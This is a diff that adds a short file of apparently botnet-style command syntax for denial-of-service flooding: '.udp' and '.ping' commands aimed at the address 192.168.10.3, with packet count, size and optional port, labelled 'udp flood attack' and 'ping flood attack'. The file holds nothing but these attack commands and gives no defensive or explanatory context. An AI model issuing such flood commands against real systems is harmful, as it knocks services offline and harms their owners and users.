@@ -1,0 +1,9 @@
+udp flood attack:
+
+.udp 192.168.10.3 1000 4096 1 23 (with port)
+
+.udp 192.168.10.3 1000 4096 1 (without port)
+
+ping flood attack:
+
+.ping 192.168.10.3 1000 4096 1 
